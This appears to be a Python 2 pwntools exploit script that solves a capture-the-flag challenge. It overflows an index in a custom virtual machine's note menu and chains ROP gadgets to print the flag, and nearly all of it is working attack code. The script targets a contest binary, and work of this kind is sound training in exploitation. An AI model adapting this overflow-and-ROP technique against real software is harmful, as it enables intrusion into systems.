from pwn import remote, process, p64


class do_rop():
    def __init__(self, r=0):
        if r:
            self.r = remote('xxxxx', 31337)
        else:
            orm, ormb = './binary_flag/orm', './binary_flag/chal.ormb'
            self.r = process([orm, ormb])
        self.r.recvuntil('>>> ')

    def add(self, n, d):
        self.r.sendline('A')
        self.r.recvuntil(': ')
        self.r.send(n)
        self.r.recvuntil(': ')
        self.r.send(d)
        d = int(self.r.recvline().split(' ')[-1][:-2])  # index
        self.r.recvuntil('>>> ')
        return d

    def show(self, n):
        self.r.sendline('S')
        self.r.recvuntil(': ')
        self.r.sendline(str(n))
        d = self.r.recvuntil('=======')
        self.r.recvuntil('>>> ')
        return d[:-1]

    def migrate(self, n, d):
        self.r.sendline('M')
        self.r.recvuntil(': ')
        self.r.sendline(str(n))
        self.r.recvuntil('[+] new description (max:128):')
        self.r.sendline(d)

    def __call__(self, pay):
        assert (len(pay) < 127)
        self.add('a\n', ''.join(reversed(pay)) + '\n')
        for _ in range(8):  # index: 8 -> overflow desp[0]->name
            self.add('a\n', 'b\n')
        self.migrate(0, 'desc\n')
        return self.r


if __name__ == '__main__':
    '''
    80808080808084d2:	0b                         	pushrf
    80808080808084d3:	0f                         	pushrb
    80808080808084d4:	0f                         	pushrb
    80808080808084d5:	d0 b6 03 00 00 80 00 00 00 	call strlen
    80808080808084de:	0b                         	pushrf
    80808080808084df:	14                         	popb
    80808080808084e0:	0b                         	pushrf
    80808080808084e1:	08 01 00 00 00 00 00 00 00 	pushcf 1
    80808080808084ea:	d0 9a 00 00 00 80 00 00 00 	call write
    '''

    FLAG = 0x90909090909091b6  # Flag starts with {
    FLAG = FLAG + 2            # Align. Ignore first two bytes of flag, "CO"
    halt = 0x8080808080808671
    pbrb = 0x8080808080808668
    writer = 0x80808080808084d2

    pay = [
            p64(pbrb),
            p64(FLAG),
            p64(writer),
            p64(halt),
        ]
    r = do_rop(True)(pay)
    flag = 'CO' + r.recvuntil('[+] new description').split('[+]')[0][1:]
    print '[+] FLAG: {}'.format(flag)
    r.close()
